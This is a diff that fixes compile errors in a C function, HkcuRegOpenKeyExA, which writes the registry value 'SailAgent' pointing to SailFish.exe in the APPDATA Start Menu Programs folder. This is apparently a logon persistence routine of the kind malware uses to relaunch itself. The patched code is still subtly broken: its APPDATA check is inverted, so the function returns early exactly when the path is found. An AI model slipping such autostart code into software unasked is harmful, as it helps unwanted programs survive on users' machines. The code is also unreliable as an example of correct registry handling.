@@ -5,7 +5,7 @@
 int HkcuRegOpenKeyExA() {
     char appDataPath[MAX_PATH];
     char finalPath[MAX_PATH];
-    if (GetEnviromentVariable("APPDATA", appDataPath, MAX_PATH) > 0) {
+    if (GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH) > 0) {
         return -1;
     }
     snprintf(finalPath, sizeof(finalPath), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\SailFish.exe", appDataPath);
@@ -21,7 +21,7 @@ int HkcuRegOpenKeyExA() {
     if (result == ERROR_SUCCESS) {
         const char* valueName = "SailAgent";
 
-        LONG setRes = regSetValueExA(
+        LONG setRes = RegSetValueExA(
             hKEY,
             valueName,
             0,
@@ -29,17 +29,16 @@ int HkcuRegOpenKeyExA() {
             (const BYTE*)finalPath,
             strlen(finalPath) + 1
         );
-        
-        RegCloseKey(hKEY)
-        
-        if (SetRes == ERROR_SUCCESS) {
-            printf("ok");
+        RegCloseKey(hKEY);
+        if (setRes == ERROR_SUCCESS) {
+            printf(" Registry.\n");
         } else {
-            printf("RegSetValueExA %ld\n", setRes);
-
-        } else {
-            printf("RegOpenKeyExA %ld\n", setRes);
+            printf(" RegSetValueExA : %ld\n", setRes);
         }
-        return 0;
+    } else {
+        
+        printf(" RegOpenKeyExA : %ld\n", result);
+    }
 
+    return 0;
 }
